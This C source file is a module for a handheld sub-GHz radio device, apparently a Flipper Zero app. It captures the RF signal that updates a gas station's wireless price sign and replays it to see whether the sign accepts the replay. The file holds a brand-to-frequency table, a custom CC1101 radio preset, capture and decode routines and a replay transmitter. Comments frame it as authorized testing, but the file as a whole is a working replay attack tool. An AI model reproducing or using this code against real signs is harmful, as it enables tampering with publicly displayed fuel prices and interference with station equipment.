// Price Sign RF Audit — AUTHORIZED PENTEST MODULE
// Use only with written owner authorization.
// Tests whether wireless price sign updates use authenticated protocols.

#include "../gas_station_audit.h"
#include "../gsa_storage.h"

static const struct {
    uint32_t freq;
    const char* brand;
    const char* modulation;
} GSA_SIGN_FREQS[] = {
    {315000000, "Generic/Stewart-Warner", "OOK"},
    {433920000, "Trans-Lux/Watchfire",    "OOK"},
    {868350000, "EU Daktronics",          "FSK"},
    {902000000, "Daktronics ISM",         "OOK"},
    {915000000, "Adaptive Micro/Gilbarco","FSK"},
    {917000000, "Wayne POS ctrl",         "FSK"},
    {928000000, "ISM band generic",       "OOK"},
};
#define GSA_SIGN_FREQ_COUNT 7

#define GSA_CAPTURE_MAX_SAMPLES 2048

typedef enum {
    PriceSignStateIdle = 0,
    PriceSignStateCapture,
    PriceSignStateGotSignal,
    PriceSignStateReplay,
    PriceSignStateReplayDone,
} PriceSignState;

typedef struct {
    PriceSignState state;
    uint8_t  freq_idx;
    uint8_t  tick;
    bool     capture_active;
    uint32_t capture_freq;
    int8_t   capture_rssi;
    uint32_t capture_samples;
    uint32_t capture_duration;
    char     capture_brand[32];
    char     capture_mod[8];
    bool     replay_accepted;
    char     decoded_hex[48];
    char     finding[128];
} PriceSignViewModel;

// CC1101 OOK 650kHz async preset — addr/val pairs, 0x00 0x00 terminated
static const uint8_t gsa_ook650_preset[] = {
    0x02, 0x0D,  0x08, 0x32,  0x0B, 0x06,
    0x10, 0x67,  0x11, 0x32,  0x12, 0x30,
    0x13, 0x00,  0x14, 0x00,  0x17, 0x00,
    0x18, 0x18,  0x19, 0x16,  0x1B, 0x07,
    0x1C, 0x00,  0x1D, 0x91,  0x20, 0xFB,
    0x21, 0xB6,  0x22, 0x11,  0x00, 0x00,
};

static uint32_t* capture_buf = NULL;
static uint32_t  capture_len = 0;
static uint32_t  tx_idx      = 0;

// ── Sub-GHz RX callback ───────────────────────────────────────────────────────
static void subghz_rx_callback(bool level, uint32_t duration, void* ctx) {
    UNUSED(ctx);
    if(capture_buf && capture_len < GSA_CAPTURE_MAX_SAMPLES) {
        capture_buf[capture_len++] =
            ((level ? 1UL : 0UL) << 31) | (duration & 0x7FFFFFFF);
    }
}

// ── TX replay callback — feeds captured durations back to CC1101 ──────────────
// FuriHalSubGhzAsyncTxCallback: LevelDuration(*)(void*)
// Signal done by returning level_duration_reset() (duration == 0).
static LevelDuration tx_replay_callback(void* ctx) {
    UNUSED(ctx);
    if(tx_idx >= capture_len) return level_duration_reset();
    uint32_t sample = capture_buf[tx_idx++];
    bool lv   = (sample >> 31) & 1;
    uint32_t dur = sample & 0x7FFFFFFF;
    return level_duration_make(lv, dur);
}

// ── Decode helper ─────────────────────────────────────────────────────────────
static void decode_capture(PriceSignViewModel* m) {
    if(capture_len == 0) {
        snprintf(m->decoded_hex, sizeof(m->decoded_hex), "(no data)");
        return;
    }
    uint8_t bits[20] = {0};
    uint8_t bit_count = 0;
    for(uint32_t i = 0; i < capture_len && bit_count < 160; i++) {
        uint32_t dur = capture_buf[i] & 0x7FFFFFFF;
        bool lv = (capture_buf[i] >> 31) & 1;
        if(lv) {
            int b = (dur < 800) ? 1 : 0;
            bits[bit_count / 8] |= (uint8_t)(b << (7 - (bit_count % 8)));
            bit_count++;
        }
    }
    int pos = 0;
    for(int i = 0; i < 10 && pos < 47; i++)
        pos += snprintf(m->decoded_hex + pos, 48 - pos, "%02X ", bits[i]);

    if(bit_count > 20) {
        snprintf(m->finding, sizeof(m->finding),
            "CAPTURED %u bits @ %luMHz\n"
            "REPLAY TEST: transmit to verify\n"
            "auth token. If accepted = CRITICAL.",
            bit_count,
            (unsigned long)(m->capture_freq / 1000000));
    } else {
        snprintf(m->finding, sizeof(m->finding),
            "Weak signal — reposition closer\n"
            "to sign or change price again.");
    }
}

// ── View draw ─────────────────────────────────────────────────────────────────
void gsa_price_sign_view_draw(Canvas* canvas, void* model) {
    PriceSignViewModel* m = model;
    canvas_clear(canvas);
    canvas_set_color(canvas, ColorBlack);

    canvas_draw_rbox(canvas, 0, 0, 128, 12, 2);
    canvas_set_color(canvas, ColorWhite);
    canvas_set_font(canvas, FontSecondary);
    canvas_draw_str(canvas, 2, 9, "PRICE SIGN RF AUDIT");
    canvas_set_color(canvas, ColorBlack);

    char buf[48];
    canvas_set_font(canvas, FontSecondary);

    switch(m->state) {

    case PriceSignStateIdle:
        canvas_set_font(canvas, FontPrimary);
        canvas_draw_str_aligned(canvas, 64, 18, AlignCenter, AlignTop, "READY");
        canvas_set_font(canvas, FontSecondary);
        snprintf(buf, sizeof(buf), "Freq: %s", GSA_SIGN_FREQS[m->freq_idx].brand);
        canvas_draw_str(canvas, 2, 33, buf);
        snprintf(buf, sizeof(buf), "%luMHz %s",
            (unsigned long)(GSA_SIGN_FREQS[m->freq_idx].freq / 1000000),
            GSA_SIGN_FREQS[m->freq_idx].modulation);
        canvas_draw_str(canvas, 2, 42, buf);
        canvas_draw_str(canvas, 2, 55, "[OK]capture  [<>]freq  [BACK]");
        break;

    case PriceSignStateCapture:
        canvas_set_font(canvas, FontPrimary);
        canvas_draw_str_aligned(canvas, 64, 15, AlignCenter, AlignTop, "CAPTURING...");
        canvas_set_font(canvas, FontSecondary);
        canvas_draw_str_aligned(canvas, 64, 27, AlignCenter, AlignTop,
            "Have owner change price NOW");
        {
            uint8_t wave_x = (m->tick * 3) % 118;
            canvas_draw_box(canvas, wave_x, 40, 10, 4);
            canvas_draw_box(canvas, wave_x > 10 ? wave_x - 10 : 0, 42, 8, 2);
        }
        snprintf(buf, sizeof(buf), "Samples: %lu", (unsigned long)capture_len);
        canvas_draw_str(canvas, 2, 52, buf);
        canvas_draw_str(canvas, 2, 61, "[OK]stop capture  [BACK]cancel");
        break;

    case PriceSignStateGotSignal:
        canvas_draw_str(canvas, 2, 16, "SIGNAL CAPTURED!");
        snprintf(buf, sizeof(buf), "RSSI: %d dBm  Samples: %lu",
            m->capture_rssi, (unsigned long)m->capture_samples);
        canvas_draw_str(canvas, 2, 25, buf);
        canvas_draw_str(canvas, 2, 34, m->decoded_hex);
        canvas_draw_str(canvas, 2, 43, m->finding);
        canvas_draw_str(canvas, 2, 61, "[OK]REPLAY TEST  [BACK]discard");
        break;

    case PriceSignStateReplay:
        canvas_set_font(canvas, FontPrimary);
        canvas_draw_str_aligned(canvas, 64, 18, AlignCenter, AlignTop, "TRANSMITTING...");
        canvas_set_font(canvas, FontSecondary);
        canvas_draw_str_aligned(canvas, 64, 32, AlignCenter, AlignTop,
            "Watch the price sign.");
        canvas_draw_str_aligned(canvas, 64, 42, AlignCenter, AlignTop,
            "Did it change?");
        break;

    case PriceSignStateReplayDone:
        if(m->replay_accepted) {
            canvas_draw_rbox(canvas, 0, 13, 128, 14, 2);
            canvas_set_color(canvas, ColorWhite);
            canvas_draw_str_aligned(canvas, 64, 17, AlignCenter, AlignTop,
                "!! CRITICAL FINDING !!");
            canvas_set_color(canvas, ColorBlack);
            canvas_draw_str(canvas, 2, 31, "Sign ACCEPTED replay.");
            canvas_draw_str(canvas, 2, 40, "No replay protection.");
            canvas_draw_str(canvas, 2, 49, "Unauthenticated RF ctrl.");
        } else {
            canvas_draw_str(canvas, 2, 22, "Sign did NOT respond.");
            canvas_draw_str(canvas, 2, 31, "May have replay protection");
            canvas_draw_str(canvas, 2, 40, "or wrong frequency/protocol.");
        }
        canvas_draw_str(canvas, 2, 61, "[OK]save finding  [BACK]menu");
        break;
    }
}

bool gsa_price_sign_view_input(InputEvent* ev, void* ctx) {
    GasStationAuditApp* app = ctx;
    if(ev->type != InputTypeShort) return false;

    with_view_model(app->bt_view, PriceSignViewModel* m, {
        switch(m->state) {
        case PriceSignStateIdle:
            if(ev->key == InputKeyOk) {
                if(!capture_buf)
                    capture_buf = malloc(GSA_CAPTURE_MAX_SAMPLES * sizeof(uint32_t));
                capture_len = 0;
                m->capture_freq  = GSA_SIGN_FREQS[m->freq_idx].freq;
                strncpy(m->capture_brand, GSA_SIGN_FREQS[m->freq_idx].brand, 31);
                strncpy(m->capture_mod,   GSA_SIGN_FREQS[m->freq_idx].modulation, 7);
                m->state = PriceSignStateCapture;
                m->capture_active = true;

                furi_hal_subghz_reset();
                furi_hal_subghz_load_custom_preset(gsa_ook650_preset);
                furi_hal_subghz_set_frequency_and_path(m->capture_freq);
                furi_hal_subghz_start_async_rx(subghz_rx_callback, app);
            }
            if(ev->key == InputKeyRight)
                m->freq_idx = (m->freq_idx + 1) % GSA_SIGN_FREQ_COUNT;
            if(ev->key == InputKeyLeft)
                m->freq_idx = (m->freq_idx + GSA_SIGN_FREQ_COUNT - 1) % GSA_SIGN_FREQ_COUNT;
            break;

        case PriceSignStateCapture:
            if(ev->key == InputKeyOk) {
                furi_hal_subghz_stop_async_rx();
                furi_hal_subghz_idle();
                m->capture_active  = false;
                m->capture_samples = capture_len;
                m->capture_rssi    = furi_hal_subghz_get_rssi();
                decode_capture(m);
                m->state = PriceSignStateGotSignal;
            }
            break;

        case PriceSignStateGotSignal:
            if(ev->key == InputKeyOk) {
                m->state = PriceSignStateReplay;
                if(capture_buf && capture_len > 0) {
                    tx_idx = 0;
                    furi_hal_subghz_reset();
                    furi_hal_subghz_load_custom_preset(gsa_ook650_preset);
                    furi_hal_subghz_set_frequency_and_path(m->capture_freq);
                    furi_hal_subghz_start_async_tx(tx_replay_callback, NULL);
                    furi_delay_ms(600);
                    furi_hal_subghz_stop_async_tx();
                    furi_hal_subghz_idle();
                }
                m->state = PriceSignStateReplayDone;
                notification_message(app->notifications, &sequence_blink_red_10);
            }
            if(ev->key == InputKeyBack) {
                if(capture_buf) { free(capture_buf); capture_buf = NULL; }
                capture_len = 0;
                m->state = PriceSignStateIdle;
            }
            break;

        case PriceSignStateReplay:
            // TX in progress — no input handled
            break;

        case PriceSignStateReplayDone:
            if(ev->key == InputKeyOk) {
                char line[GSA_LOG_LINE_MAX];
                char ts[24]; gsa_get_timestamp(ts);
                snprintf(line, sizeof(line),
                    "PRICE_SIGN|%s|%luMHz|%s|samples:%lu|rssi:%d|replay:%s|hex:%s",
                    ts,
                    (unsigned long)(m->capture_freq / 1000000),
                    m->capture_brand,
                    (unsigned long)m->capture_samples,
                    m->capture_rssi,
                    m->replay_accepted ? "ACCEPTED-CRITICAL" : "no-response",
                    m->decoded_hex);
                gsa_write_encrypted_record(app->storage, line);
                notification_message(app->notifications, &sequence_success);
                m->state = PriceSignStateIdle;
                if(capture_buf) { free(capture_buf); capture_buf = NULL; }
                capture_len = 0;
            }
            if(ev->key == InputKeyUp)   m->replay_accepted = true;
            if(ev->key == InputKeyDown) m->replay_accepted = false;
            break;
        }
    }, true);

    if(ev->key == InputKeyBack) {
        view_dispatcher_send_custom_event(app->view_dispatcher, GsaEventBack);
        return true;
    }
    return true;
}

// ── Scene wrappers ────────────────────────────────────────────────────────────
void gsa_scene_price_sign_on_enter(void* ctx) {
    GasStationAuditApp* app = ctx;
    with_view_model(app->bt_view, PriceSignViewModel* m, {
        memset(m, 0, sizeof(PriceSignViewModel));
    }, false);
    view_set_draw_callback(app->bt_view, gsa_price_sign_view_draw);
    view_set_input_callback(app->bt_view, gsa_price_sign_view_input);
    view_dispatcher_switch_to_view(app->view_dispatcher, GsaViewBt);
}

bool gsa_scene_price_sign_on_event(void* ctx, SceneManagerEvent ev) {
    GasStationAuditApp* app = ctx;
    if(ev.type == SceneManagerEventTypeCustom && ev.event == GsaEventBack) {
        scene_manager_previous_scene(app->scene_manager);
        return true;
    }
    if(ev.type == SceneManagerEventTypeBack) return false;
    return false;
}

void gsa_scene_price_sign_on_exit(void* ctx) {
    GasStationAuditApp* app = ctx;
    view_set_draw_callback(app->bt_view, gsa_bt_view_draw);
    view_set_input_callback(app->bt_view, gsa_bt_view_input);
    furi_hal_subghz_idle();
    furi_hal_subghz_sleep();
}
